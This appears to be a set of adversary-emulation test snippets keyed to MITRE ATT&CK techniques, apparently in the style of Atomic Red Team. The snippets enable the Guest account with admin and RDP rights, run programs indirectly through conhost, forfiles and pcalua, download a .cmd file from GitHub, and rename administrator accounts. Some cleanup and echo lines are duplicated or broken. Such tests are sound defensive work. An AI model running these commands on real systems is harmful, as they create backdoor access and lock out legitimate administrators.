T1078.001
###### Step 1 Attack
```
net user Guest /active:yes
net user Guest winter2022
net localgroup Administrators Guest /add
net localgroup "Remote Desktop Users" Guest /add
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
```
###### Step 2 Cleanup
```
net user Guest /active:no >nul 2>&1
net localgroup Administrators Guest /delete >nul 2>&1
net localgroup "Remote Desktop Users" Guest /delete >nul 2>&1
if (Test-Path "hklm\system\CurrentControlSet\Control\Terminal Server") {write-host "Skipping Cleanup - RDP connection configurations are already compromised." -ForegroundColor Cyan} else {write-host "Compromised RDP accounts have been deleted. Time to cleanup the registry... T1078.001 1 - Enable Guest account with RDP capability and admin privileges" -ForegroundColor Cyan}
reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
```
```
reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
```

```
Test 3 - conhost.exe
@Echo off
conhost.exe "notepad.exe" && (Echo Success Attack: T1202 Test 3 - Indirect Command Execution - conhost.exe) || (Echo Fail Attack: T1202 Test 3 - Indirect Command Execution - conhost.exe)
```

```
T1202 Test 2 forfiles.exe
@Echo off
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe && (Echo Success Attack: T1202 Test 2 - Indirect Command Execution forfiles.exe) || (Echo Fail Attack: T1202 Test 2 - Indirect Command Execution forfiles.exe)
 && (Echo Success Attck: T1202 Test 2 - Indirect Command Execution forfiles.exe) || (Echo Fail Attck: T1202 Test 2 - Indirect Command Execution forfiles.exe)
```

T1202 Test 1 pcalua.exe
:: Run with command shell
```
@Echo off
```
```
pcalua.exe -a calc.exe && (Echo Success Attack: T1202 Test 1 - Indirect Command Execution pcalua.exe) || (Echo Fail Attack: T1202 Test 1 - Indirect Command Execution pcalua.exe)
```
```
pcalua.exe -a C:\Windows\System32\calc.exe && (Echo Success Attck: T1202 Test 1 - Indirect Command Execution pcalua.exe) || (Echo Fail Attck: T1202 Test 1 - Indirect Command Execution pcalua.exe)
```


T1059.003
New-Item -Type Directory (split-path $env:temp\aet\kaskaskia\src\t1059.003_read_execute_cmd_file.cmd) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/jsprat000/bin/blob/main/t1059.003_read_execute_cmd_file.cmd" -OutFile "$env:temp\aet\kaskaskia\src\t1059.003_read_execute_cmd_file.cmd"

T1098
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like "*.\COEUser*") {
        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
        Write-Host "Successfully Renamed Administrator Account on" $hostname
        }
    }
